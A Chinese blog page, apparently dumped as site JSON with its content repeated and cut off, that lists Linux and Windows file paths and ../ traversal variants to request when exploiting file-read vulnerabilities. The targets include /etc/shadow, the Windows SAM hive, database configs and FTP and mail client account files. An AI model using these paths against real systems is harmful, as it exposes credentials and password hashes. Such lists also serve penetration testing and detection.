ccess_log\n/var/www/logs/access.log\n/usr/local/apache/logs/error_log\n/usr/local/apache/logs/error.log\n/usr/local/apache/logs/access_log\n/usr/local/apache/logs/access.log\n/var/log/error_log\n/var/log/error.log\n/var/log/access_log\n/var/log/access.log\n/usr/local/apache/logs/access_logaccess_log.old\n/usr/local/apache/logs/error_logerror_log.old\n/etc/php.ini\n/bin/php.ini\n/etc/init.d/httpd\n/etc/init.d/mysql\n/etc/httpd/php.ini\n/usr/lib/php.ini\n/usr/lib/php/php.ini\n/usr/local/etc/php.ini\n/usr/local/lib/php.ini\n/usr/local/php/lib/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php4/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php5/lib/php.ini\n/usr/local/php5/etc/php.ini\n/usr/local/php5/php5.ini\n/usr/local/apache/conf/php.ini\n/usr/local/apache/conf/httpd.conf\n/usr/local/apache2/conf/httpd.conf\n/usr/local/apache2/conf/php.ini\n/etc/php4.4/fcgi/php.ini\n/etc/php4/apache/php.ini\n/etc/php4/apache2/php.ini\n/etc/php5/apache/php.ini\n/etc/php5/apache2/php.ini\n/etc/php/php.ini\n/etc/php/php4/php.ini\n/etc/php/apache/php.ini\n/etc/php/apache2/php.ini\n/web/conf/php.ini\n/usr/local/Zend/etc/php.ini\n/opt/xampp/etc/php.ini\n/var/local/www/conf/php.ini\n/var/local/www/conf/httpd.conf\n/etc/php/cgi/php.ini\n/etc/php4/cgi/php.ini\n/etc/php5/cgi/php.ini\n/php5/php.ini\n/php4/php.ini\n/php/php.ini\n/PHP/php.ini\n/apache/php/php.ini\n/xampp/apache/bin/php.ini\n/xampp/apache/conf/httpd.conf\n/NetServer/bin/stable/apache/php.ini\n/home2/bin/stable/apache/php.ini\n/home/bin/stable/apache/php.ini\n/var/log/mysql/mysql-bin.log\n/var/log/mysql.log\n/var/log/mysqlderror.log\n/var/log/mysql/mysql.log\n/var/log/mysql/mysql-slow.log\n/var/mysql.log\n/var/lib/mysql/my.cnf\n/usr/local/mysql/my.cnf\n/usr/local/mysql/bin/mysql\n/etc/mysql/my.cnf\n/etc/my.cnf\n/usr/local/cpanel/logs\n/usr/local/cpanel/logs/stats_log\n/usr/local/cpanel/logs/access_log\n/usr/local/cpanel/logs/error_log\n/usr/local/cpanel/logs/license_log\n/usr/local/cpanel/logs/login_log\n/usr/local/cpanel/logs/stats_log\n/usr/local/share/examples/php4/php.ini\n/usr/local/share/examples/php/php.ini</code></pre><p>2..windows常见路径（可以将c盘换成d,e盘,比如星外虚拟主机跟华众得,一般都放在d盘）</p>\n<pre><code>c:\\windows\\php.ini\nc:\\boot.ini\nc:\\1.txt\nc:\\a.txt\n\nc:\\CMailServer\\config.ini\nc:\\CMailServer\\CMailServer.exe\nc:\\CMailServer\\WebMail\\index.asp\nc:\\program files\\CMailServer\\CMailServer.exe\nc:\\program files\\CMailServer\\WebMail\\index.asp\nC:\\WinWebMail\\SysInfo.ini\nC:\\WinWebMail\\Web\\default.asp\nC:\\WINDOWS\\FreeHost32.dll\nC:\\WINDOWS\\7i24iislog4.exe\nC:\\WINDOWS\\7i24tool.exe\n\nc:\\hzhost\\databases\\url.asp\n\nc:\\hzhost\\hzclient.exe\nC:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\7i24虚拟主机管理平台\\自动设置[受控端].lnk\n\nC:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\Serv-U\\Serv-U Administrator.lnk\nC:\\WINDOWS\\web.config\nc:\\web\\index.html\nc:\\www\\index.html\nc:\\WWWROOT\\index.html\nc:\\website\\index.html\nc:\\web\\index.asp\nc:\\www\\index.asp\nc:\\wwwsite\\index.asp\nc:\\WWWROOT\\index.asp\nc:\\web\\index.php\nc:\\www\\index.php\nc:\\WWWROOT\\index.php\nc:\\WWWsite\\index.php\nc:\\web\\default.html\nc:\\www\\default.html\nc:\\WWWROOT\\default.html\nc:\\website\\default.html\nc:\\web\\default.asp\nc:\\www\\default.asp\nc:\\wwwsite\\default.asp\nc:\\WWWROOT\\default.asp\nc:\\web\\default.php\nc:\\www\\default.php\nc:\\WWWROOT\\default.php\nc:\\WWWsite\\default.php\nC:\\Inetpub\\wwwroot\\pagerror.gif\nc:\\windows\\notepad.exe\nc:\\winnt\\notepad.exe\nC:\\Program Files\\Microsoft Office\\OFFICE10\\winword.exe\nC:\\Program Files\\Microsoft Office\\OFFICE11\\winword.exe\nC:\\Program Files\\Microsoft Office\\OFFICE12\\winword.exe\nC:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\nC:\\Program Files\\winrar\\rar.exe\nC:\\Program Files\\360\\360Safe\\360safe.exe\nC:\\Program Files\\360Safe\\360safe.exe\nC:\\Documents and Settings\\Administrator\\Application Data\\360Safe\\360Examine\\360Examine.log\nc:\\ravbin\\store.ini\nc:\\rising.ini\nC:\\Program Files\\Rising\\Rav\\RsTask.xml\nC:\\Documents and Settings\\All Users\\Start Menu\\desktop.ini\nC:\\Documents and Settings\\Administrator\\My Documents\\Default.rdp\nC:\\Documents and Settings\\Administrator\\Cookies\\index.dat\nC:\\Documents and Settings\\Administrator\\My Documents\\新建 文本文档.txt\nC:\\Documents and Settings\\Administrator\\桌面\\新建 文本文档.txt\nC:\\Documents and Settings\\Administrator\\My Documents\\1.txt\nC:\\Documents and Settings\\Administrator\\桌面\\1.txt\nC:\\Documents and Settings\\Administrator\\My Documents\\a.txt\nC:\\Documents and Settings\\Administrator\\桌面\\a.txt\nC:\\Documents and Settings\\All Users\\Documents\\My Pictures\\Sample Pictures\\Blue hills.jpg\nE:\\Inetpub\\wwwroot\\aspnet_client\\system_web\\1_1_4322\\SmartNav.htm\nC:\\Program Files\\RhinoSoft.com\\Serv-U\\Version.txt\nC:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini\nC:\\Program Files\\Symantec\\SYMEVENT.INF\nC:\\Program Files\\Microsoft SQL Server\\80\\Tools\\Binn\\sqlmangr.exe\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\MSSQL.1\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\MSSQL.2\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\80\\Tools\\HTML\\database.htm\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\README.TXT\nC:\\Program Files\\Microsoft SQL Server\\90\\Tools\\Bin\\DdsShapes.dll\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\sqlsunin.ini\nC:\\MySQL\\MySQL Server 5.0\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\data\\mysql\\user.frm\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\COPYING\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\share\\mysql_fix_privilege_tables.sql\nC:\\Program Files\\MySQL\\MySQL Server 4.1\\bin\\mysql.exe\nc:\\MySQL\\MySQL Server 4.1\\bin\\mysql.exe\nc:\\MySQL\\MySQL Server 4.1\\data\\mysql\\user.frm\nC:\\Program Files\\Oracle\\oraconfig\\Lpk.dll\nC:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet_state.exe\nC:\\WINDOWS\\system32\\inetsrv\\w3wp.exe\nC:\\WINDOWS\\system32\\inetsrv\\inetinfo.exe\nC:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml\nC:\\WINDOWS\\system32\\inetsrv\\iisadmpwd\\achg.asp\nC:\\WINDOWS\\system32\\config\\default.LOG\nC:\\WINDOWS\\system32\\config\\sam\nC:\\WINDOWS\\system32\\config\\system\nc:\\CMailServer\\config.ini\nc:\\program files\\CMailServer\\config.ini\nc:\\tomcat6\\tomcat6\\bin\\version.sh\nc:\\tomcat6\\bin\\version.sh\nc:\\tomcat\\bin\\version.sh\nc:\\program files\\tomcat6\\bin\\version.sh\nC:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\bin\\version.sh\nc:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\logs\\isapi_redirect.log\nc:\\Apache2\\Apache2\\bin\\Apache.exe\nc:\\Apache2\\bin\\Apache.exe\nc:\\Apache2\\php\\license.txt\nC:\\Program Files\\Apache Group\\Apache2\\bin\\Apache.exe\n/usr/local/tomcat5527/bin/version.sh\n/usr/share/tomcat6/bin/startup.sh\n/usr/tomcat6/bin/startup.sh\nc:\\Program Files\\QQ2007\\qq.exe\nc:\\Program Files\\Tencent\\qq\\User.db\nc:\\Program Files\\Tencent\\qq\\qq.exe\nc:\\Program Files\\Tencent\\qq\\bin\\qq.exe\nc:\\Program Files\\Tencent\\qq2009\\qq.exe\nc:\\Program Files\\Tencent\\qq2008\\qq.exe\nc:\\Program Files\\Tencent\\qq2010\\bin\\qq.exe\nc:\\Program Files\\Tencent\\qq\\Users\\All Users\\Registry.db\nC:\\Program Files\\Tencent\\TM\\TMDlls\\QQZip.dll\nc:\\Program Files\\Tencent\\Tm\\Bin\\Txplatform.exe\nc:\\Program Files\\Tencent\\RTXServer\\AppConfig.xml\nC:\\Program Files\\Foxmal\\Foxmail.exe\nC:\\Program Files\\Foxmal\\accounts.cfg\nC:\\Program Files\\tencent\\Foxmal\\Foxmail.exe\nC:\\Program Files\\tencent\\Foxmal\\accounts.cfg\nC:\\Program Files\\LeapFTP 3.0\\LeapFTP.exe\nC:\\Program Files\\LeapFTP\\LeapFTP.exe\nc:\\Program Files\\GlobalSCAPE\\CuteFTP Pro\\cftppro.exe\nc:\\Program Files\\GlobalSCAPE\\CuteFTP Pro\\notes.txt\nC:\\Program Files\\FlashFXP\\FlashFXP.ini\nC:\\Program Files\\FlashFXP\\flashfxp.exe\nc:\\Program Files\\Oracle\\bin\\regsvr32.exe\nc:\\Program Files\\腾讯游戏\\QQGAME\\readme.txt\nc:\\Program Files\\tencent\\腾讯游戏\\QQGAME\\readme.txt\nc:\\Program Files\\tencent\\QQGAME\\readme.txt\nC:\\Program Files\\StormII\\Storm.exe</code></pre><p>3.网站相对路径:</p>\n<pre><code>/config.php\n../../config.php\n../config.php\n../../../config.php\n/config.inc.php\n./config.inc.php\n../../config.inc.php\n../config.inc.php\n../../../config.inc.php\n/conn.php\n./conn.php\n../../conn.php\n../conn.php\n../../../conn.php\n/conn.asp\n./conn.asp\n../../conn.asp\n../conn.asp\n../../../conn.asp\n/config.inc.php\n./config.inc.php\n../../config.inc.php\n../config.inc.php\n../../../config.inc.php\n/config/config.php\n../../config/config.php\n../config/config.php\n../../../config/config.php\n/config/config.inc.php\n./config/config.inc.php\n../../config/config.inc.php\n../config/config.inc.php\n../../../config/config.inc.php\n/config/conn.php\n./config/conn.php\n../../config/conn.php\n../config/conn.php\n../../../config/conn.php\n/config/conn.asp\n./config/conn.asp\n../../config/conn.asp\n../config/conn.asp\n../../../config/conn.asp\n/config/config.inc.php\n./config/config.inc.php\n../../config/config.inc.php\n../config/config.inc.php\n../../../config/config.inc.php\n/data/config.php\n../../data/config.php\n../data/config.php\n../../../data/config.php\n/data/config.inc.php\n./data/config.inc.php\n../../data/config.inc.php\n../data/config.inc.php\n../../../data/config.inc.php\n/data/conn.php\n./data/conn.php\n../../data/conn.php\n../data/conn.php\n../../../data/conn.php\n/data/conn.asp\n./data/conn.asp\n../../data/conn.asp\n../data/conn.asp\n../../../data/conn.asp\n/data/config.inc.php\n./data/config.inc.php\n../../data/config.inc.php\n../data/config.inc.php\n../../../data/config.inc.php\n/include/config.php\n../../include/config.php\n../include/config.php\n../../../include/config.php\n/include/config.inc.php\n./include/config.inc.php\n../../include/config.inc.php\n../include/config.inc.php\n../../../include/config.inc.php\n/include/conn.php\n./include/conn.php\n../../include/conn.php\n../include/conn.php\n../../../include/conn.php\n/include/conn.asp\n./include/conn.asp\n../../include/conn.asp\n../include/conn.asp\n../../../include/conn.asp\n/include/config.inc.php\n./include/config.inc.php\n../../include/config.inc.php\n../include/config.inc.php\n../../../include/config.inc.php\n/inc/config.php\n../../inc/config.php\n../inc/config.php\n../../../inc/config.php\n/inc/config.inc.php\n./inc/config.inc.php\n../../inc/config.inc.php\n../inc/config.inc.php\n../../../inc/config.inc.php\n/inc/conn.php\n./inc/conn.php\n../../inc/conn.php\n../inc/conn.php\n../../../inc/conn.php\n/inc/conn.asp\n./inc/conn.asp\n../../inc/conn.asp\n../inc/conn.asp\n../../../inc/conn.asp\n/inc/config.inc.php\n./inc/config.inc.php\n../../inc/config.inc.php\n../inc/config.inc.php\n../../../inc/config.inc.php\n/index.php\n./index.php\n../../index.php\n../index.php\n../../../index.php\n/index.asp\n./index.asp\n../../index.asp\n../index.asp\n../../../index.asp</code></pre>","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"文件读取漏洞路径收集\"><a href=\"#文件读取漏洞路径收集\" class=\"headerlink\" title=\"文件读取漏洞路径收集\"></a>文件读取漏洞路径收集</h1><pre><code>/etc/passwd\n/etc/shadow\n/etc/issue\n/etc/fstab\n/etc/host.conf\n/etc/motd\n/etc/ld.so.conf\n/etc/sysconfig/network-scripts/ifcfg-eth0\n/etc/sysconfig/network-scripts/ifcfg-eth1\n/var/www/htdocs/index.php\n/var/www/conf/httpd.conf\n/var/www/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/httpd/htdocs/index.php\n/var/httpd/conf/httpd.conf\n/var/httpd/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/www/index.html\n/var/www/index.php\n/opt/www/conf/httpd.conf\n/opt/www/htdocs/index.php\n/opt/www/htdocs/index.html\n/usr/local/apache/htdocs/index.html\n/usr/local/apache/htdocs/index.php\n/usr/local/apache2/htdocs/index.html\n/usr/local/apache2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.html\n/tmp/apache/htdocs/index.html\n/tmp/apache/htdocs/index.php\n/etc/httpd/htdocs/index.php\n/etc/httpd/conf/httpd.conf\n/etc/httpd/htdocs/index.html\n/www/php/php.ini\n/www/php4/php.ini\n/www/php5/php.ini\n/www/conf/httpd.conf\n/www/htdocs/index.php\n/www/htdocs/index.html\n\n/usr/local/httpd/conf/httpd.conf\n/apache/apache/conf/httpd.conf\n/apache/apache2/conf/httpd.conf\n/etc/apache/apache.conf\n/etc/apache2/apache.conf\n/etc/apache/httpd.conf\n/etc/apache2/httpd.conf\n/etc/apache2/vhosts.d/00_default_vhost.conf\n/etc/apache2/sites-available/default\n\n/etc/phpmyadmin/config.inc.php\n/etc/mysql/my.cnf\n/etc/httpd/conf.d/php.conf\n/etc/httpd/conf.d/httpd.conf\n\n/etc/httpd/logs/error_log\n/etc/httpd/logs/error.log\n/etc/httpd/logs/access_log\n/etc/httpd/logs/access.log\n/home/apache/conf/httpd.conf\n/home/apache2/conf/httpd.conf\n\n/var/log/apache/error_log\n/var/log/apache/error.log\n/var/log/apache/access_log\n/var/log/apache/access.log\n/var/log/apache2/error_log\n/var/log/apache2/error.log\n/var/log/apache2/access_log\n/var/log/apache2/access.log\n/var/www/logs/error_log\n/var/www/logs/error.log\n/var/www/logs/access_log\n/var/www/logs/access.log\n/usr/local/apache/logs/error_log\n/usr/local/apache/logs/error.log\n/usr/local/apache/logs/access_log\n/usr/local/apache/logs/access.log\n\n/var/log/error_log\n/var/log/error.log\n/var/log/access_log\n/var/log/access.log\n\n/usr/local/apache/logs/access_logaccess_log.old\n/usr/local/apache/logs/error_logerror_log.old\n\n/etc/php.ini\n/bin/php.ini\n/etc/init.d/httpd\n/etc/init.d/mysql\n\n/etc/httpd/php.ini\n/usr/lib/php.ini\n/usr/lib/php/php.ini\n/usr/local/etc/php.ini\n/usr/local/lib/php.ini\n/usr/local/php/lib/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php4/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php5/lib/php.ini\n/usr/local/php5/etc/php.ini\n/usr/local/php5/php5.ini\n/usr/local/apache/conf/php.ini\n\n/usr/local/apache/conf/httpd.conf\n/usr/local/apache2/conf/httpd.conf\n\n/usr/local/apache2/conf/php.ini\n/etc/php4.4/fcgi/php.ini\n/etc/php4/apache/php.ini\n/etc/php4/apache2/php.ini\n/etc/php5/apache/php.ini\n/etc/php5/apache2/php.ini\n/etc/php/php.ini\n/etc/php/php4/php.ini\n/etc/php/apache/php.ini\n/etc/php/apache2/php.ini\n/web/conf/php.ini\n/usr/local/Zend/etc/php.ini\n/opt/xampp/etc/php.ini\n/var/local/www/conf/php.ini\n/var/local/www/conf/httpd.conf\n/etc/php/cgi/php.ini\n/etc/php4/cgi/php.ini\n/etc/php5/cgi/php.ini\n\n/php5/php.ini\n/php4/php.ini\n/php/php.ini\n/PHP/php.ini\n\n/apache/php/php.ini\n\n/xampp/apache/bin/php.ini\n/xampp/apache/conf/httpd.conf\n/NetServer/bin/stable/apache/php.ini\n/home2/bin/stable/apache/php.ini\n\n/home/bin/stable/apache/php.ini\n\n/var/log/mysql/mysql-bin.log\n/var/log/mysql.log\n/var/log/mysqlderror.log\n/var/log/mysql/mysql.log\n/var/log/mysql/mysql-slow.log\n/var/mysql.log\n\n/var/lib/mysql/my.cnf\n/usr/local/mysql/my.cnf\n/usr/local/mysql/bin/mysql\n/etc/mysql/my.cnf\n/etc/my.cnf\n\n/usr/local/cpanel/logs\n/usr/local/cpanel/logs/stats_log\n/usr/local/cpanel/logs/access_log\n/usr/local/cpanel/logs/error_log\n/usr/local/cpanel/logs/license_log\n/usr/local/cpanel/logs/login_log\n/usr/local/cpanel/logs/stats_log\n/usr/local/share/examples/php4/php.ini\n/usr/local/share/examples/php/php.ini</code></pre><p>1.LINUX常见路径：</p>\n<pre><code>/etc/passwd\n/etc/shadow\n/etc/fstab\n/etc/host.conf\n/etc/motd\n/etc/ld.so.conf\n/var/www/htdocs/index.php\n/var/www/conf/httpd.conf\n/var/www/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/httpd/htdocs/index.php\n/var/httpd/conf/httpd.conf\n/var/httpd/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/www/index.html\n/var/www/index.php\n/opt/www/conf/httpd.conf\n/opt/www/htdocs/index.php\n/opt/www/htdocs/index.html\n/usr/local/apache/htdocs/index.html\n/usr/local/apache/htdocs/index.php\n/usr/local/apache2/htdocs/index.html\n/usr/local/apache2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.html\n/tmp/apache/htdocs/index.html\n/tmp/apache/htdocs/index.php\n/etc/httpd/htdocs/index.php\n/etc/httpd/conf/httpd.conf\n/etc/httpd/htdocs/index.html\n/www/php/php.ini\n/www/php4/php.ini\n/www/php5/php.ini\n/www/conf/httpd.conf\n/www/htdocs/index.php\n/www/htdocs/index.html\n/usr/local/httpd/conf/httpd.conf\n/apache/apache/conf/httpd.conf\n/apache/apache2/conf/httpd.conf\n/etc/apache/apache.conf\n/etc/apache2/apache.conf\n/etc/apache/httpd.conf\n/etc/apache2/httpd.conf\n/etc/apache2/vhosts.d/00_default_vhost.conf\n/etc/apache2/sites-available/default\n/etc/phpmyadmin/config.inc.php\n/etc/mysql/my.cnf\n/etc/httpd/conf.d/php.conf\n/etc/httpd/conf.d/httpd.conf\n/etc/httpd/logs/error_log\n/etc/httpd/logs/error.log\n/etc/httpd/logs/access_log\n/etc/httpd/logs/access.log\n/home/apache/conf/httpd.conf\n/home/apache2/conf/httpd.conf\n/var/log/apache/error_log\n/var/log/apache/error.log\n/var/log/apache/access_log\n/var/log/apache/access.log\n/var/log/apache2/error_log\n/var/log/apache2/error.log\n/var/log/apache2/access_log\n/var/log/apache2/access.log\n/var/www/logs/error_log\n/var/www/logs/error.log\n/var/www/logs/access_log\n/var/www/logs/access.log\n/usr/local/apache/logs/error_log\n/usr/local/apache/logs/error.log\n/usr/local/apache/logs/access_log\n/usr/local/apache/logs/access.log\n/var/log/error_log\n/var/log/error.log\n/var/log/access_log\n/var/log/access.log\n/usr/local/apache/logs/access_logaccess_log.old\n/usr/local/apache/logs/error_logerror_log.old\n/etc/php.ini\n/bin/php.ini\n/etc/init.d/httpd\n/etc/init.d/mysql\n/etc/httpd/php.ini\n/usr/lib/php.ini\n/usr/lib/php/php.ini\n/usr/local/etc/php.ini\n/usr/local/lib/php.ini\n/usr/local/php/lib/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php4/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php5/lib/php.ini\n/usr/local/php5/etc/php.ini\n/usr/local/php5/php5.ini\n/usr/local/apache/conf/php.ini\n/usr/local/apache/conf/httpd.conf\n/usr/local/apache2/conf/httpd.conf\n/usr/local/apache2/conf/php.ini\n/etc/php4.4/fcgi/php.ini\n/etc/php4/apache/php.ini\n/etc/php4/apache2/php.ini\n/etc/php5/apache/php.ini\n/etc/php5/apache2/php.ini\n/etc/php/php.ini\n/etc/php/php4/php.ini\n/etc/php/apache/php.ini\n/etc/php/apache2/php.ini\n/web/conf/php.ini\n/usr/local/Zend/etc/php.ini\n/opt/xampp/etc/php.ini\n/var/local/www/conf/php.ini\n/var/local/www/conf/httpd.conf\n/etc/php/cgi/php.ini\n/etc/php4/cgi/php.ini\n/etc/php5/cgi/php.ini\n/php5/php.ini\n/php4/php.ini\n/php/php.ini\n/PHP/php.ini\n/apache/php/php.ini\n/xampp/apache/bin/php.ini\n/xampp/apache/conf/httpd.conf\n/NetServer/bin/stable/apache/php.ini\n/home2/bin/stable/apache/php.ini\n/home/bin/stable/apache/php.ini\n/var/log/mysql/mysql-bin.log\n/var/log/mysql.log\n/var/log/mysqlderror.log\n/var/log/mysql/mysql.log\n/var/log/mysql/mysql-slow.log\n/var/mysql.log\n/var/lib/mysql/my.cnf\n/usr/local/mysql/my.cnf\n/usr/local/mysql/bin/mysql\n/etc/mysql/my.cnf\n/etc/my.cnf\n/usr/local/cpanel/logs\n/usr/local/cpanel/logs/stats_log\n/usr/local/cpanel/logs/access_log\n/usr/local/cpanel/logs/error_log\n/usr/local/cpanel/logs/license_log\n/usr/local/cpanel/logs/login_log\n/usr/local/cpanel/logs/stats_log\n/usr/local/share/examples/php4/php.ini\n/usr/local/share/examples/php/php.ini</code></pre><p>2..windows常见路径（可以将c盘换成d,e盘,比如星外虚拟主机跟华众得,一般都放在d盘）</p>\n<pre><code>c:\\windows\\php.ini\nc:\\boot.ini\nc:\\1.txt\nc:\\a.txt\n\nc:\\CMailServer\\config.ini\nc:\\CMailServer\\CMailServer.exe\nc:\\CMailServer\\WebMail\\index.asp\nc:\\program files\\CMailServer\\CMailServer.exe\nc:\\program files\\CMailServer\\WebMail\\index.asp\nC:\\WinWebMail\\SysInfo.ini\nC:\\WinWebMail\\Web\\default.asp\nC:\\WINDOWS\\FreeHost32.dll\nC:\\WINDOWS\\7i24iislog4.exe\nC:\\WINDOWS\\7i24tool.exe\n\nc:\\hzhost\\databases\\url.asp\n\nc:\\hzhost\\hzclient.exe\nC:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\7i24虚拟主机管理平台\\自动设置[受控端].lnk\n\nC:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\Serv-U\\Serv-U Administrator.lnk\nC:\\WINDOWS\\web.config\nc:\\web\\index.html\nc:\\www\\index.html\nc:\\WWWROOT\\index.html\nc:\\website\\index.html\nc:\\web\\index.asp\nc:\\www\\index.asp\nc:\\wwwsite\\index.asp\nc:\\WWWROOT\\index.asp\nc:\\web\\index.php\nc:\\www\\index.php\nc:\\WWWROOT\\index.php\nc:\\WWWsite\\index.php\nc:\\web\\default.html\nc:\\www\\default.html\nc:\\WWWROOT\\default.html\nc:\\website\\default.html\nc:\\web\\default.asp\nc:\\www\\default.asp\nc:\\wwwsite\\default.asp\nc:\\WWWROOT\\default.asp\nc:\\web\\default.php\nc:\\www\\default.php\nc:\\WWWROOT\\default.php\nc:\\WWWsite\\default.php\nC:\\Inetpub\\wwwroot\\pagerror.gif\nc:\\windows\\notepad.exe\nc:\\winnt\\notepad.exe\nC:\\Program Files\\Microsoft Office\\OFFICE10\\winword.exe\nC:\\Program Files\\Microsoft Office\\OFFICE11\\winword.exe\nC:\\Program Files\\Microsoft Office\\OFFICE12\\winword.exe\nC:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\nC:\\Program Files\\winrar\\rar.exe\nC:\\Program Files\\360\\360Safe\\360safe.exe\nC:\\Program Files\\360Safe\\360safe.exe\nC:\\Documents and Settings\\Administrator\\Application Data\\360Safe\\360Examine\\360Examine.log\nc:\\ravbin\\store.ini\nc:\\rising.ini\nC:\\Program Files\\Rising\\Rav\\RsTask.xml\nC:\\Documents and Settings\\All Users\\Start Menu\\desktop.ini\nC:\\Documents and Settings\\Administrator\\My Documents\\Default.rdp\nC:\\Documents and Settings\\Administrator\\Cookies\\index.dat\nC:\\Documents and Settings\\Administrator\\My Documents\\新建 文本文档.txt\nC:\\Documents and Settings\\Administrator\\桌面\\新建 文本文档.txt\nC:\\Documents and Settings\\Administrator\\My Documents\\1.txt\nC:\\Documents and Settings\\Administrator\\桌面\\1.txt\nC:\\Documents and Settings\\Administrator\\My Documents\\a.txt\nC:\\Documents and Settings\\Administrator\\桌面\\a.txt\nC:\\Documents and Settings\\All Users\\Documents\\My Pictures\\Sample Pictures\\Blue hills.jpg\nE:\\Inetpub\\wwwroot\\aspnet_client\\system_web\\1_1_4322\\SmartNav.htm\nC:\\Program Files\\RhinoSoft.com\\Serv-U\\Version.txt\nC:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini\nC:\\Program Files\\Symantec\\SYMEVENT.INF\nC:\\Program Files\\Microsoft SQL Server\\80\\Tools\\Binn\\sqlmangr.exe\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\MSSQL.1\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\MSSQL.2\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\80\\Tools\\HTML\\database.htm\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\README.TXT\nC:\\Program Files\\Microsoft SQL Server\\90\\Tools\\Bin\\DdsShapes.dll\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\sqlsunin.ini\nC:\\MySQL\\MySQL Server 5.0\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\data\\mysql\\user.frm\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\COPYING\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\share\\mysql_fix_privilege_tables.sql\nC:\\Program Files\\MySQL\\MySQL Server 4.1\\bin\\mysql.exe\nc:\\MySQL\\MySQL Server 4.1\\bin\\mysql.exe\nc:\\MySQL\\MySQL Server 4.1\\data\\mysql\\user.frm\nC:\\Program Files\\Oracle\\oraconfig\\Lpk.dll\nC:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet_state.exe\nC:\\WINDOWS\\system32\\inetsrv\\w3wp.exe\nC:\\WINDOWS\\system32\\inetsrv\\inetinfo.exe\nC:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml\nC:\\WINDOWS\\system32\\inetsrv\\iisadmpwd\\achg.asp\nC:\\WINDOWS\\system32\\config\\default.LOG\nC:\\WINDOWS\\system32\\config\\sam\nC:\\WINDOWS\\system32\\config\\system\nc:\\CMailServer\\config.ini\nc:\\program files\\CMailServer\\config.ini\nc:\\tomcat6\\tomcat6\\bin\\version.sh\nc:\\tomcat6\\bin\\version.sh\nc:\\tomcat\\bin\\version.sh\nc:\\program files\\tomcat6\\bin\\version.sh\nC:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\bin\\version.sh\nc:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\logs\\isapi_redirect.log\nc:\\Apache2\\Apache2\\bin\\Apache.exe\nc:\\Apache2\\bin\\Apache.exe\nc:\\Apache2\\php\\license.txt\nC:\\Program Files\\Apache Group\\Apache2\\bin\\Apache.exe\n/usr/local/tomcat5527/bin/version.sh\n/usr/share/tomcat6/bin/startup.sh\n/usr/tomcat6/bin/startup.sh\nc:\\Program Files\\QQ2007\\qq.exe\nc:\\Program Files\\Tencent\\qq\\User.db\nc:\\Program Files\\Tencent\\qq\\qq.exe\nc:\\Program Files\\Tencent\\qq\\bin\\qq.exe\nc:\\Program Files\\Tencent\\qq2009\\qq.exe\nc:\\Program Files\\Tencent\\qq2008\\qq.exe\nc:\\Program Files\\Tencent\\qq2010\\bin\\qq.exe\nc:\\Program Files\\Tencent\\qq\\Users\\All Users\\Registry.db\nC:\\Program Files\\Tencent\\TM\\TMDlls\\QQZip.dll\nc:\\Program Files\\Tencent\\Tm\\Bin\\Txplatform.exe\nc:\\Program Files\\Tencent\\RTXServer\\AppConfig.xml\nC:\\Program Files\\Foxmal\\Foxmail.exe\nC:\\Program 